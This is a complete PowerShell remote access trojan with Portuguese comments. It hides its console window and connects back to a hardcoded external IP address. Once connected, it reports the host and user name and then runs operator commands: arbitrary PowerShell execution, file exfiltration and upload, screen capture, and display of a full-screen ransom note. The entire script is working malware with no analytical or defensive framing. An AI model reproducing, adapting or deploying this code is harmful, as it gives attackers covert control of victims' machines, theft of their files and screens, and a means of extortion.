# Ocultar janela
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$hwnd = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($hwnd, 0)

# Configuração
$ip = "52.23.171.223"
$port = 8081

$CurrentPath = Get-Location

function Send-Bytes {
    param($data)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
        $size = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder($bytes.Length))
        $stream.Write($size, 0, 4)
        $stream.Write($bytes, 0, $bytes.Length)
    } catch {
        Write-Host "[X] Erro ao enviar dados: $_"
    }
}

function Send-File {
    param($filePath)
    try {
        if (!(Test-Path $filePath)) {
            Send-Bytes "[Erro] Arquivo não encontrado para envio."
            return
        }
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $size = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder($fileBytes.Length))
        $stream.Write($size, 0, 4)
        $stream.Write($fileBytes, 0, $fileBytes.Length)
    }
    catch {
        Send-Bytes "[Erro] Falha ao ler ou enviar o arquivo: $_"
    }
}

function Read-Bytes {
    param($count)
    try {
        $buffer = New-Object byte[] $count
        $read = 0
        while ($read -lt $count) {
            $r = $stream.Read($buffer, $read, $count - $read)
            if ($r -le 0) { break }
            $read += $r
        }
        if ($read -ne $count) {
            throw "Leitura incompleta no socket"
        }
        return $buffer
    } catch {
        Send-Bytes "[Erro] Falha ao ler dados da conexão: $_"
        return $null
    }
}

function Read-Message {
    $sizeBytes = Read-Bytes 4
    if ($sizeBytes -eq $null) { return $null }
    $size = [System.Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($sizeBytes, 0))
    if ($size -le 0 -or $size -gt 500000000) {
        Send-Bytes "[Erro] Tamanho de mensagem inválido recebido: $size"
        return $null
    }
    $data = Read-Bytes $size
    if ($data -eq $null) { return $null }
    return [System.Text.Encoding]::UTF8.GetString($data)
}

function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bitmap.Size)
        $out = "$env:TEMP\screenshot.png"
        $bitmap.Save($out, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        return $out
    }
    catch {
        return $null
    }
}

function Start-RansomNoteThread {
    param([string]$ImagePath)
    try {
        $ScriptBlock = {
            param($path)
            try {
                Add-Type -AssemblyName PresentationFramework
                Add-Type -AssemblyName WindowsBase
                Add-Type -AssemblyName PresentationCore

                $window = New-Object Windows.Window
                $window.WindowStyle = 'None'
                $window.WindowState = 'Maximized'
                $window.Topmost = $true
                $window.ResizeMode = 'NoResize'
                $window.Background = 'Black'

                $grid = New-Object Windows.Controls.Grid

                $image = New-Object Windows.Controls.Image
                $bitmap = New-Object Windows.Media.Imaging.BitmapImage
                $bitmap.BeginInit()
                $bitmap.UriSource = (New-Object System.Uri($path))
                $bitmap.EndInit()
                $image.Source = $bitmap
                $image.Stretch = 'Uniform'

                $button = New-Object Windows.Controls.Button
                $button.Content = ""
                $button.Width = 30
                $button.Height = 30
                $button.HorizontalAlignment = 'Right'
                $button.VerticalAlignment = 'Bottom'
                $button.Margin = '0,0,10,10'
                $button.Background = 'DarkGray'
                $button.BorderBrush = 'Gray'
                $button.Opacity = 0.3
                $button.ToolTip = "Liberar"
                $button.Add_Click({ $window.Close() })

                $grid.Children.Add($image)
                $grid.Children.Add($button)
                $window.Content = $grid
                $window.ShowDialog() | Out-Null
            } catch {
                # Mesmo se o WPF falhar, o agente não trava
            }
        }

        $Runspace = [runspacefactory]::CreateRunspace()
        $Runspace.ApartmentState = "STA"
        $Runspace.Open()

        $PS = [powershell]::Create().AddScript($ScriptBlock).AddArgument($ImagePath)
        $PS.Runspace = $Runspace
        $null = $PS.BeginInvoke()
    }
    catch {
        Send-Bytes "[Erro] Falha ao abrir ransomnote: $_"
    }
}

# Iniciar conexão principal
try {
    $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
    $stream = $client.GetStream()
    Send-Bytes "Conectado de $env:COMPUTERNAME - $env:USERNAME - "

    while ($client.Connected) {
        $cmd = Read-Message
        if ($null -eq $cmd) { break }
        if ($cmd -eq "exit") { break }

        try {
            if ($cmd.ToLower().StartsWith("cd ")) {
                $target = $cmd.Substring(3).Trim()
                if (Test-Path $target) {
                    Set-Location $target
                    $CurrentPath = Get-Location
                    Send-Bytes "Diretório atual: $($CurrentPath.Path)"
                } else {
                    Send-Bytes "[Erro] Diretório não encontrado."
                }
                continue
            }

            if ($cmd.ToLower().StartsWith("download ")) {
                $fileName = $cmd.Substring(9).Trim()
                $path = Join-Path $CurrentPath.Path $fileName
                Send-File $path
                continue
            }

            if ($cmd.ToLower().StartsWith("upload ")) {
                $fileName = $cmd.Substring(7).Trim()
                $path = Join-Path $CurrentPath.Path $fileName
                $sizeBytes = Read-Bytes 4
                if ($sizeBytes -eq $null) { continue }
                $size = [System.Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($sizeBytes, 0))
                $data = Read-Bytes $size
                if ($data -eq $null) { continue }
                [System.IO.File]::WriteAllBytes($path, $data)
                Send-Bytes "Upload concluído para $path"
                continue
            }

            if ($cmd.ToLower().StartsWith("ransomnote ")) {
                $fileName = $cmd.Substring(11).Trim()
                $path = Join-Path $CurrentPath.Path $fileName
                $sizeBytes = Read-Bytes 4
                if ($sizeBytes -eq $null) { continue }
                $size = [System.Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($sizeBytes, 0))
                $data = Read-Bytes $size
                if ($data -eq $null) { continue }
                [System.IO.File]::WriteAllBytes($path, $data)
                Send-Bytes "Nota de resgate recebida. Exibindo..."    
                Start-RansomNoteThread -ImagePath $path
                continue
            }

            if ($cmd -eq "screenshot") {
                $ss = Capture-Screenshot
                if ($ss) {
                    Send-File $ss
                    Remove-Item $ss -Force
                } else {
                    Send-Bytes "[Erro] Falha na captura de tela."
                }
                continue
            }

            if ($cmd -eq "help") {
                $h = @"
========= Comandos =========
help                  -> Lista comandos
exit                  -> Encerra
screenshot            -> Screenshot da tela
cd [pasta]            -> Altera diretório
download [arquivo]    -> Baixa arquivo
upload [arquivo_dest] -> Envia arquivo
ransomnote [arquivo]  -> Exibe nota de resgate
[comando]             -> Executa PowerShell
============================
"@
                Send-Bytes $h
                continue
            }

            # Execução normal de comandos PowerShell
            Push-Location $CurrentPath
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($out)) { $out = "[Sem saída]" }
                Send-Bytes $out
            } catch {
                Send-Bytes "[Erro de execução] $_"
            }
            Pop-Location
        }
        catch {
            Send-Bytes "[Erro interno ao processar comando]: $_"
        }
    }

    $client.Close()
} catch {
    Write-Host "[X] Falha na conexão: $_"
}
